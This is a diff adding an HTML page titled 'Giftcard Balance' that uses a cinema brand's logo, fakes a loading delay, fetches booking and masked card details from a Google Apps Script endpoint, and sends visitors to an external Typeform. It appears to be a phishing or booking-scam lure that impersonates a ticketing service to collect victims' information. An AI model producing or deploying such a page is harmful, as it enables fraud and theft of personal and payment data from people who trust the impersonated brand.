@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giftcard Balance</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #003a7e;
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .container {
+            margin-top: 15%;
+        }
+        #loadingMessage {
+            font-size: 26px;
+            color: #ffffff;
+        }
+        #continueButton, #redeemButton {
+            display: none;
+            margin-top: 20px;
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: #005bb5;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #continueButton:hover, #redeemButton:hover {
+            background-color: #007bff;
+        }
+        #logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        #balanceDisplay {
+            margin-top: 20px;
+            font-size: 22px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img id="logo" src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20240904.1" alt="Logo">
+        
+        <p id="loadingMessage">We are loading booking details...</p>
+        <button id="continueButton" onclick="fetchBalance()">Check Booking Details</button>
+        <button id="redeemButton" onclick="redeemBalance()">Refresh</button>
+    </div>
+
+    <div id="balanceDisplay" style="display:none;"></div>
+
+    <script>
+        // Mostrar el botón de continuar después de 3 segundos
+        setTimeout(function() {
+            document.getElementById("loadingMessage").style.display = "none";
+            document.getElementById("continueButton").style.display = "block";
+        }, 3000);
+
+        // Función para obtener los datos del Google Sheets
+        function fetchBalance() {
+            document.getElementById("continueButton").style.display = "none";
+
+            fetch('https://script.google.com/macros/s/AKfycbzPrNWfO4WMhcUxtVtJRZLcSn2SVKtLDOc1x9rUKtrtOLH8YgbuKiNXweOx9bslRWDycA/exec')
+                .then(response => response.json())
+                .then(data => {
+                    const display = `
+
+                        <p>BookingID: ${data.A2}</p>
+                        <p>MaskedCreditCardNumber: ${data.B2}</p>
+                        <p>CardType: ${data.C2}</p>
+                        <p>Cinema: ${data.C2}</p>
+                    `;
+                    document.getElementById("balanceDisplay").innerHTML = display;
+                    document.getElementById("balanceDisplay").style.display = "block";
+
+                    // Mostrar el botón "Redeem Balance"
+                    document.getElementById("redeemButton").style.display = "block";
+                })
+                .catch(error => console.error('Error fetching balance:', error));
+        }
+
+        // Función para redirigir a otra URL cuando se haga clic en "Redeem Balance"
+        function redeemBalance() {
+            window.location.href = 'https://qkstzdro6ry.typeform.com/to/MIf1SW2o';
+        }
+    </script>
+</body>
+</html>
